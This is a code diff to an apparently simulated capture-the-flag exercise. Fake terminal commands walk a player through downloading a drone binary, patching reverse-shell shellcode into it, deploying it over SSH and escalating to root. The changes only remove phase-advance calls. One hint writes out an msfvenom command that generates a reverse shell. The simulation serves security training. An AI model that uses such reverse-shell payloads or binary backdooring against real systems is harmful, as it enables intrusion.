@@ -758,7 +758,6 @@ Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
 
             if (url.includes('drone_commander.bin') && url.includes('10.0.13.5')) {
                 C17Config._binaryAcquired = true;
-                if (engine) engine.advancePhase && engine.advancePhase('acquire');
                 return `--2026-03-20 14:22:07--  http://10.0.13.5/artifacts/drone_commander.bin
 Connecting to 10.0.13.5:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -785,7 +784,6 @@ ERROR 404: Not Found.`;
 
             if (url.includes('drone_commander.bin') && url.includes('10.0.13.5')) {
                 C17Config._binaryAcquired = true;
-                if (engine) engine.advancePhase && engine.advancePhase('acquire');
                 return `  % Total    % Received % Xferd  Average Speed   Time
 100 18842  100 18842    0     0  1884200      0 --:--:-- --:--:-- --:--:-- 18.4M
 [+] drone_commander.bin downloaded to current directory.`;
@@ -862,7 +860,6 @@ Program Header:
         'ghidra': function(args) {
             if (!C17Config._binaryAcquired) return 'ghidra: drone_commander.bin: No such file or directory';
             C17Config._ghidraLoaded = true;
-            if (engine) engine.advancePhase && engine.advancePhase('reverse');
             return `[+] Ghidra 11.1.2 (headless mode)
 [*] Project: /home/kali/ghidra_projects/c17-forge
 [*] Importing: drone_commander.bin
@@ -887,7 +884,6 @@ ${C17Config._binaryProfile.ghidra_decompile}
             if (!C17Config._binaryAcquired) return 'gdb: drone_commander.bin: No such file or directory';
             const argStr = args.join(' ');
             if (argStr.includes('drone_commander') || args.length === 0) {
-                if (engine) engine.advancePhase && engine.advancePhase('reverse');
                 return `GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
 Reading symbols from drone_commander.bin...
 (No debugging symbols found in drone_commander.bin)
@@ -970,7 +966,6 @@ Generating: /home/kali/shellcode.bin (${lhost}:${lport})
                     return '[!] shellcode.bin not found. Generate shellcode first:\n    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -b "\\x00" -o shellcode.bin';
                 }
                 C17Config._binaryPatched = true;
-                if (engine) engine.advancePhase && engine.advancePhase('patch');
                 return `[*] Reading drone_commander.bin (18842 bytes)
 [*] Loading shellcode from shellcode.bin (135 bytes)
 [*] Code cave located at offset 0x11f0 (156 bytes available, 135 needed — OK)
@@ -1040,7 +1035,6 @@ Permission denied, please try again.
                 }
                 C17Config._sshAuthenticated = true;
                 C17Config._switchContext('ssh-drone', term);
-                if (engine) engine.advancePhase && engine.advancePhase('deploy');
                 return `The authenticity of host '10.0.13.20 (10.0.13.20)' can't be established.
 ED25519 key fingerprint is SHA256:mQ7tR2nP4kF9vB8wL1jE5cX3dA0sZ6yH2gN7iM4oC8.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -1095,7 +1089,6 @@ drone_operator@AD-DRONE-01:~$
                     return 'sudo: cp: /tmp/patched_drone_commander.bin: No such file or directory\n[!] Upload the patched binary to /tmp/ via scp first.';
                 }
                 C17Config._binaryDeployed = true;
-                if (engine) engine.advancePhase && engine.advancePhase('deploy');
                 return `[sudo] password for drone_operator:
 [+] Binary replaced: /usr/local/bin/drone_commander.bin -> patched version
 [+] File size: 18842 bytes (matches expected)
@@ -1115,7 +1108,6 @@ Drone Command System v2.4.1 - Awaiting command parameter...
                 }
                 C17Config._shellReceived = true;
                 C17Config._switchContext('root-drone', term);
-                if (engine) engine.advancePhase && engine.advancePhase('trigger');
                 return `[sudo] password for drone_operator:
 [+] Running drone_commander.bin as root...
 Drone Command System v2.4.1 - Awaiting command parameter...
@@ -1160,7 +1152,6 @@ Sorry, user drone_operator is not allowed to execute '${args.join(' ')}' as root
                 if (ctx !== 'root-drone') {
                     return `cat: /root/drone_master_override.txt: Permission denied\n[!] You need root access. Trigger the exploit to escalate.`;
                 }
-                if (engine) engine.advancePhase && engine.advancePhase('trigger');
                 return `cat: /root/drone_master_override.txt
 
 {{FLAG:root}}`;
